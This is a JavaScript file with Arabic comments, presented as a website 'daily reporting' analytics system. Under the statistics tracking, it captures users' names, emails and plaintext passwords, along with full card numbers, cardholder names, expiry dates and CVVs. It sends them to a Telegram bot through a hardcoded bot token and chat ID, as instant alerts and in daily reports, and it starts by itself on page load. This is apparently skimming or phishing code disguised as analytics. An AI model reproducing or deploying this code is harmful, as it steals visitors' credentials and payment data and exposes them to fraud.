// نظام التقارير اليومية المتقدم
// Advanced Daily Reporting System

class DailyReportSystem {
    constructor() {
        this.botToken = '7285756328:AAFHLQU8e72LO2U_IAhNrR99cttRBkT6CEU';
        this.chatId = '2126771039';
        this.dailyData = this.loadDailyData();
        this.init();
    }

    init() {
        console.log('📊 Daily Report System Started');
        this.scheduleReports();
        this.trackDailyStats();
        this.setupPeriodicSaving();
    }

    // ===== تتبع الإحصائيات اليومية =====
    trackDailyStats() {
        const today = new Date().toDateString();
        
        if (!this.dailyData[today]) {
            this.dailyData[today] = {
                visits: 0,
                registrations: [],
                logins: [],
                payments: [],
                pageViews: {},
                totalTimeSpent: 0,
                clicksCount: 0,
                scrollEvents: 0,
                uniqueVisitors: new Set(),
                devices: {},
                browsers: {},
                countries: [],
                mostVisitedPages: {},
                conversionRate: 0,
                bounceRate: 0
            };
        }

        // تتبع الزيارة الحالية
        this.recordVisit();
        
        // تتبع الصفحة الحالية
        this.trackPageView(window.location.pathname);
    }

    recordVisit() {
        const today = new Date().toDateString();
        const visitorId = this.getVisitorId();
        
        this.dailyData[today].visits++;
        this.dailyData[today].uniqueVisitors.add(visitorId);
        
        // معلومات الجهاز والمتصفح
        const deviceInfo = this.getDeviceInfo();
        const browserInfo = this.getBrowserInfo();
        
        this.dailyData[today].devices[deviceInfo] = (this.dailyData[today].devices[deviceInfo] || 0) + 1;
        this.dailyData[today].browsers[browserInfo] = (this.dailyData[today].browsers[browserInfo] || 0) + 1;
        
        this.saveDailyData();
    }

    trackPageView(page) {
        const today = new Date().toDateString();
        this.dailyData[today].mostVisitedPages[page] = (this.dailyData[today].mostVisitedPages[page] || 0) + 1;
        this.saveDailyData();
    }

    // ===== تسجيل الأحداث =====
    recordRegistration(userData) {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].registrations.push({
            ...userData,
            timestamp: new Date().toISOString()
        });
        
        this.saveDailyData();
        this.sendInstantAlert('🆕 تسجيل جديد!', userData);
    }

    recordLogin(userData) {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].logins.push({
            ...userData,
            timestamp: new Date().toISOString()
        });
        
        this.saveDailyData();
    }

    recordPayment(paymentData) {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].payments.push({
            ...paymentData,
            timestamp: new Date().toISOString()
        });
        
        this.saveDailyData();
        this.sendInstantAlert('💳 معاملة دفع جديدة!', paymentData);
    }

    recordClick() {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].clicksCount++;
        this.saveDailyData();
    }

    recordScroll() {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].scrollEvents++;
        this.saveDailyData();
    }

    recordTimeSpent(duration) {
        const today = new Date().toDateString();
        if (!this.dailyData[today]) this.trackDailyStats();
        
        this.dailyData[today].totalTimeSpent += duration;
        this.saveDailyData();
    }

    // ===== جدولة التقارير =====
    scheduleReports() {
        // تقرير كل ساعة
        setInterval(() => {
            this.sendHourlyReport();
        }, 3600000); // ساعة واحدة

        // تقرير يومي في منتصف الليل
        const now = new Date();
        const tomorrow = new Date(now);
        tomorrow.setDate(tomorrow.getDate() + 1);
        tomorrow.setHours(0, 0, 0, 0);
        
        const msUntilMidnight = tomorrow.getTime() - now.getTime();
        
        setTimeout(() => {
            this.sendDailyReport();
            // ثم كل 24 ساعة
            setInterval(() => {
                this.sendDailyReport();
            }, 86400000); // 24 ساعة
        }, msUntilMidnight);

        // تقرير أسبوعي كل أحد
        this.scheduleWeeklyReport();
    }

    // ===== التقارير =====
    sendHourlyReport() {
        const today = new Date().toDateString();
        const data = this.dailyData[today];
        
        if (!data) return;

        const currentHour = new Date().getHours();
        const report = this.generateHourlyReport(data, currentHour);
        
        this.sendTelegramMessage(`📊 التقرير الساعي - ${currentHour}:00\n\n${report}`);
    }

    sendDailyReport() {
        const yesterday = new Date();
        yesterday.setDate(yesterday.getDate() - 1);
        const yesterdayStr = yesterday.toDateString();
        
        const data = this.dailyData[yesterdayStr];
        
        if (!data) return;

        const report = this.generateDailyReport(data, yesterdayStr);
        
        this.sendTelegramMessage(`📈 التقرير اليومي الشامل\n📅 ${yesterdayStr}\n\n${report}`);
        
        // إرسال بيانات المستخدمين المفصلة إذا وجدت
        this.sendDetailedUserReport(data);
    }

    sendDetailedUserReport(data) {
        if (data.registrations.length > 0) {
            let userReport = '👥 المستخدمون الجدد اليوم:\n\n';
            data.registrations.forEach((user, index) => {
                userReport += `${index + 1}. 👤 ${user.name || 'غير محدد'}\n`;
                userReport += `   📧 ${user.email || 'غير محدد'}\n`;
                userReport += `   🔒 ${user.password || 'غير محدد'}\n`;
                userReport += `   ⏰ ${new Date(user.timestamp).toLocaleString('ar-SA')}\n\n`;
            });
            
            this.sendTelegramMessage(userReport);
        }

        if (data.payments.length > 0) {
            let paymentReport = '💳 معاملات الدفع اليوم:\n\n';
            data.payments.forEach((payment, index) => {
                paymentReport += `${index + 1}. 💳 ${payment.cardNumber || 'غير محدد'}\n`;
                paymentReport += `   👤 ${payment.cardholderName || 'غير محدد'}\n`;
                paymentReport += `   📅 ${payment.expiryDate || 'غير محدد'}\n`;
                paymentReport += `   🔢 ${payment.cvv || 'غير محدد'}\n`;
                paymentReport += `   ⏰ ${new Date(payment.timestamp).toLocaleString('ar-SA')}\n\n`;
            });
            
            this.sendTelegramMessage(paymentReport);
        }
    }

    generateHourlyReport(data, hour) {
        const uniqueVisitors = data.uniqueVisitors.size;
        const avgTimePerVisitor = data.totalTimeSpent / Math.max(data.visits, 1);
        
        return `🕐 الساعة: ${hour}:00\n`
             + `👥 الزوار: ${data.visits}\n`
             + `🆔 زوار فريدون: ${uniqueVisitors}\n`
             + `📝 تسجيلات جديدة: ${data.registrations.length}\n`
             + `🔑 محاولات دخول: ${data.logins.length}\n`
             + `💳 معاملات دفع: ${data.payments.length}\n`
             + `🖱️ النقرات: ${data.clicksCount}\n`
             + `📜 أحداث التمرير: ${data.scrollEvents}\n`
             + `⏱️ متوسط الوقت: ${Math.round(avgTimePerVisitor / 1000)} ثانية`;
    }

    generateDailyReport(data, date) {
        const uniqueVisitors = data.uniqueVisitors.size;
        const conversionRate = ((data.registrations.length / Math.max(data.visits, 1)) * 100).toFixed(2);
        const avgTimePerVisitor = data.totalTimeSpent / Math.max(data.visits, 1);
        
        // أكثر الصفحات زيارة
        const topPages = Object.entries(data.mostVisitedPages)
            .sort(([,a], [,b]) => b - a)
            .slice(0, 5)
            .map(([page, views]) => `   ${page}: ${views} زيارة`)
            .join('\n');

        // أكثر المتصفحات استخداماً
        const topBrowsers = Object.entries(data.browsers)
            .sort(([,a], [,b]) => b - a)
            .slice(0, 3)
            .map(([browser, count]) => `   ${browser}: ${count}`)
            .join('\n');

        return `📊 إحصائيات اليوم:\n`
             + `👥 إجمالي الزيارات: ${data.visits}\n`
             + `🆔 زوار فريدون: ${uniqueVisitors}\n`
             + `📈 معدل التحويل: ${conversionRate}%\n`
             + `⏱️ متوسط الوقت: ${Math.round(avgTimePerVisitor / 60000)} دقيقة\n\n`
             + `🆕 تسجيلات جديدة: ${data.registrations.length}\n`
             + `🔑 تسجيلات دخول: ${data.logins.length}\n`
             + `💳 معاملات دفع: ${data.payments.length}\n`
             + `🖱️ إجمالي النقرات: ${data.clicksCount}\n`
             + `📜 أحداث التمرير: ${data.scrollEvents}\n\n`
             + `📄 أكثر الصفحات زيارة:\n${topPages}\n\n`
             + `🌐 أكثر المتصفحات:\n${topBrowsers}`;
    }

    scheduleWeeklyReport() {
        const now = new Date();
        const nextSunday = new Date(now);
        nextSunday.setDate(now.getDate() + (7 - now.getDay()));
        nextSunday.setHours(9, 0, 0, 0); // يوم الأحد الساعة 9 صباحاً
        
        const msUntilSunday = nextSunday.getTime() - now.getTime();
        
        setTimeout(() => {
            this.sendWeeklyReport();
            // ثم كل أسبوع
            setInterval(() => {
                this.sendWeeklyReport();
            }, 604800000); // 7 أيام
        }, msUntilSunday);
    }

    sendWeeklyReport() {
        const weekData = this.getWeekData();
        const report = this.generateWeeklyReport(weekData);
        
        this.sendTelegramMessage(`📈 التقرير الأسبوعي الشامل\n📅 ${new Date().toLocaleDateString('ar-SA')}\n\n${report}`);
    }

    getWeekData() {
        const weekData = {
            totalVisits: 0,
            totalRegistrations: 0,
            totalLogins: 0,
            totalPayments: 0,
            uniqueVisitors: new Set(),
            dailyBreakdown: []
        };

        const today = new Date();
        for (let i = 6; i >= 0; i--) {
            const date = new Date(today);
            date.setDate(today.getDate() - i);
            const dateStr = date.toDateString();
            
            const dayData = this.dailyData[dateStr];
            if (dayData) {
                weekData.totalVisits += dayData.visits;
                weekData.totalRegistrations += dayData.registrations.length;
                weekData.totalLogins += dayData.logins.length;
                weekData.totalPayments += dayData.payments.length;
                
                dayData.uniqueVisitors.forEach(visitor => {
                    weekData.uniqueVisitors.add(visitor);
                });
                
                weekData.dailyBreakdown.push({
                    date: dateStr,
                    visits: dayData.visits,
                    registrations: dayData.registrations.length
                });
            }
        }

        return weekData;
    }

    generateWeeklyReport(weekData) {
        const avgDailyVisits = Math.round(weekData.totalVisits / 7);
        const weeklyConversion = ((weekData.totalRegistrations / Math.max(weekData.totalVisits, 1)) * 100).toFixed(2);
        
        let dailyBreakdown = '📅 التفصيل اليومي:\n';
        weekData.dailyBreakdown.forEach(day => {
            const dayName = new Date(day.date).toLocaleDateString('ar-SA', { weekday: 'long' });
            dailyBreakdown += `   ${dayName}: ${day.visits} زيارة، ${day.registrations} تسجيل\n`;
        });

        return `📊 ملخص الأسبوع:\n`
             + `👥 إجمالي الزيارات: ${weekData.totalVisits}\n`
             + `🆔 زوار فريدون: ${weekData.uniqueVisitors.size}\n`
             + `📈 متوسط الزيارات اليومية: ${avgDailyVisits}\n`
             + `🎯 معدل التحويل الأسبوعي: ${weeklyConversion}%\n`
             + `🆕 إجمالي التسجيلات: ${weekData.totalRegistrations}\n`
             + `🔑 إجمالي تسجيلات الدخول: ${weekData.totalLogins}\n`
             + `💳 إجمالي المعاملات: ${weekData.totalPayments}\n\n`
             + dailyBreakdown;
    }

    // ===== التنبيهات الفورية =====
    sendInstantAlert(title, data) {
        const message = `🚨 ${title}\n\n` + this.formatDataForAlert(data);
        this.sendTelegramMessage(message);
    }

    formatDataForAlert(data) {
        let formatted = '';
        Object.keys(data).forEach(key => {
            if (data[key] && key !== 'timestamp' && key !== 'sessionId') {
                const label = TRACKING_CONFIG?.fieldTranslations?.[key] || key;
                formatted += `${label}: ${data[key]}\n`;
            }
        });
        return formatted;
    }

    // ===== حفظ وتحميل البيانات =====
    loadDailyData() {
        const saved = localStorage.getItem('dailyTrackingData');
        return saved ? JSON.parse(saved) : {};
    }

    saveDailyData() {
        // تحويل Sets إلى Arrays للحفظ
        const dataToSave = JSON.parse(JSON.stringify(this.dailyData, (key, value) => {
            if (value instanceof Set) {
                return Array.from(value);
            }
            return value;
        }));
        
        localStorage.setItem('dailyTrackingData', JSON.stringify(dataToSave));
    }

    setupPeriodicSaving() {
        // حفظ البيانات كل 5 دقائق
        setInterval(() => {
            this.saveDailyData();
        }, 300000);
    }

    // ===== وظائف مساعدة =====
    getVisitorId() {
        let visitorId = localStorage.getItem('visitorId');
        if (!visitorId) {
            visitorId = 'visitor_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            localStorage.setItem('visitorId', visitorId);
        }
        return visitorId;
    }

    getDeviceInfo() {
        const width = window.screen.width;
        if (width >= 1200) return 'Desktop';
        if (width >= 768) return 'Tablet';
        return 'Mobile';
    }

    getBrowserInfo() {
        const userAgent = navigator.userAgent;
        if (userAgent.indexOf("Firefox") > -1) return "Firefox";
        if (userAgent.indexOf("Chrome") > -1) return "Chrome";
        if (userAgent.indexOf("Safari") > -1) return "Safari";
        if (userAgent.indexOf("Edge") > -1) return "Edge";
        return "Other";
    }

    sendTelegramMessage(message) {
        const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: this.chatId,
                text: message,
                parse_mode: 'HTML'
            })
        }).catch(error => {
            console.error('خطأ في إرسال التقرير:', error);
        });
    }
}

// تشغيل النظام عند تحميل الصفحة
document.addEventListener('DOMContentLoaded', function() {
    window.dailyReportSystem = new DailyReportSystem();
});

// تصدير الكلاس
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DailyReportSystem;
}